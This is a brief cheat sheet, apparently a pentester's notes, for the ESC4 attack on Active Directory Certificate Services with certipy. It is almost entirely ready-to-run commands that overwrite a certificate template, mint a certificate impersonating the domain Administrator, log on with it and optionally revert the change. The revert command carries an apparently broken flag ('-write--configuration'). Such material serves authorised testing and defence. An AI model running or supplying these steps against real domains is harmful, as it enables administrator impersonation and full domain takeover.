# ADCS ESC4

% adcs, certificate, ActiveDirectory, template

## 1. Finding vulnerable template
```
certipy find -u <username> -p '<password>' -target <CA_FQDN> -vulnerable -stdout
```

## 2. Write over template
```
certipy template \
    -u '<username>@<domain>' -p '<password>' \
    -dc-ip '<DC_IP>' -template '<ESC4_TEMPLATE>' \
    -write-default-configuration
```
## 3. Request a cert that impersonates Administrator
```
certipy req -u <username> -p '<password>' -target <CA_FQDN> -ca <CA_NAME> \
            -dc-ip <DC_IP> \
            -dc-host <DC_HOST> \
            -template <ESC1_TEMPLATE> \
            -upn 'administrator@<DOMAIN>' -sid <ADMIN_SID>
```

## 4. Log on with the minted cert
```
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

## 5. (Optional) Reverting Template
```
certipy template \
    -u '<username>@<domain>' -p '<password>' \
    -dc-ip '<DC_IP>' -template '<ESC4_TEMPLATE>' \
    -write--configuration <ESC4.json> -no-save
```
